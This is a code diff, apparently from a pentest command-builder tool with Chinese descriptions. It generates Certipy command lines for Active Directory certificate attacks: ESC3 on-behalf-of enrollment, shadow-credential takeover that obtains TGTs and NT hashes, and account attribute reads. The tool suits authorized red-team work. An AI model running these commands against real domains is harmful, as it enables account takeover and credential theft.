@@ -162,7 +162,7 @@ Web Enrollment 时使用。ESC8 修复后 Web Enrollment 仍可用于正常申�
         id: 'certipy-req-on-behalf-of',
         title: 'ESC3 - 代理注册 (on-behalf-of)',
         description: '先用注册代理模板拿代理证书,再用 -on-behalf-of 代其他用户申请',
-        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')} -on-behalf-of ${v(p.domain, 'DOMAIN')}\\${v('', 'TARGET_USER')} -pfx ${v(p.fileName, 'AGENT.pfx')}`,
+        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')} -on-behalf-of ${v(p.domain, 'DOMAIN')}\\${v(p.targetObject, 'TARGET_USER')} -pfx ${v(p.fileName, 'AGENT.pfx')}`,
         usage: `关键参数:
   -on-behalf-of DOMAIN\\ACCOUNT  以注册代理身份代为申请的目标账户
   -pfx FILE        注册代理证书 (PFX),即第一步申请到的代理证书
@@ -245,7 +245,7 @@ mimikatz kerberos::ptt 注入内存,即可完成 pass-the-ticket。`,
         id: 'certipy-shadow-auto',
         title: 'auto - 全自动接管',
         description: '添加 Key Credential、PKINIT 认证取 TGT+NT 哈希、恢复原有属性,一步到位',
-        build: (p) => `${buildCertipyAuth(p, 'shadow')} auto -account ${v('', 'TARGET_ACCOUNT')}`,
+        build: (p) => `${buildCertipyAuth(p, 'shadow')} auto -account ${v(p.targetObject, 'TARGET_ACCOUNT')}`,
         usage: `位置参数:
   {list,add,remove,clear,info,auto}  子动作;auto 为全自动利用
 关键参数:
@@ -261,7 +261,7 @@ KeyCredentialLink → PKINIT 取 TGT 并恢复 NT 哈希 → 删除添加的凭�
         id: 'certipy-shadow-add',
         title: 'add - 手动添加密钥凭据',
         description: '只写入新的 Key Credential,输出 PFX;之后用 certipy-ad auth -pfx 认证',
-        build: (p) => `${buildCertipyAuth(p, 'shadow')} add -account ${v('', 'TARGET_ACCOUNT')}`,
+        build: (p) => `${buildCertipyAuth(p, 'shadow')} add -account ${v(p.targetObject, 'TARGET_ACCOUNT')}`,
         usage: `位置参数:
   add              在目标账户上创建新的 Key Credential Link
 关键参数:
@@ -277,7 +277,7 @@ KeyCredentialLink → PKINIT 取 TGT 并恢复 NT 哈希 → 删除添加的凭�
         id: 'certipy-shadow-list',
         title: 'list - 列出密钥凭据',
         description: '查看目标账户当前所有 Key Credential Link,确认是否已有凭据可清除',
-        build: (p) => `${buildCertipyAuth(p, 'shadow')} list -account ${v('', 'TARGET_ACCOUNT')}`,
+        build: (p) => `${buildCertipyAuth(p, 'shadow')} list -account ${v(p.targetObject, 'TARGET_ACCOUNT')}`,
         usage: `位置参数:
   list             列出目标账户的全部 Key Credential Link
 关键参数:
@@ -292,7 +292,7 @@ KeyCredentialLink → PKINIT 取 TGT 并恢复 NT 哈希 → 删除添加的凭�
         id: 'certipy-shadow-remove',
         title: 'remove - 按 Device ID 删除',
         description: '-device-id 精确删除指定 Key Credential,用于清理自己写入的凭据',
-        build: (p) => `${buildCertipyAuth(p, 'shadow')} remove -account ${v('', 'TARGET_ACCOUNT')} -device-id ${v('', 'DEVICE_ID')}`,
+        build: (p) => `${buildCertipyAuth(p, 'shadow')} remove -account ${v(p.targetObject, 'TARGET_ACCOUNT')} -device-id ${v('', 'DEVICE_ID')}`,
         usage: `位置参数:
   remove           删除目标账户上指定的 Key Credential Link
 关键参数:
@@ -308,7 +308,7 @@ KeyCredentialLink → PKINIT 取 TGT 并恢复 NT 哈希 → 删除添加的凭�
         id: 'certipy-shadow-clear',
         title: 'clear - 清空全部密钥凭据',
         description: '删除目标账户的所有 Key Credential Link;注意会移除合法设备凭据',
-        build: (p) => `${buildCertipyAuth(p, 'shadow')} clear -account ${v('', 'TARGET_ACCOUNT')}`,
+        build: (p) => `${buildCertipyAuth(p, 'shadow')} clear -account ${v(p.targetObject, 'TARGET_ACCOUNT')}`,
         usage: `位置参数:
   clear            删除目标账户的全部 Key Credential Link
 关键参数:
@@ -557,7 +557,7 @@ auth 换 TGT 即可 DCSync。`,
         id: 'certipy-account-read',
         title: 'read - 查看账户属性',
         description: '读取账户的 DNS/UPN/SPN 等属性,更新操作前先核对当前值',
-        build: (p) => `${buildCertipyAuth(p, 'account')} -user ${v('', 'TARGET_ACCOUNT')} read`,
+        build: (p) => `${buildCertipyAuth(p, 'account')} -user ${v(p.targetObject, 'TARGET_ACCOUNT')} read`,
         usage: `位置参数:
   read             查看账户属性
 关键参数:
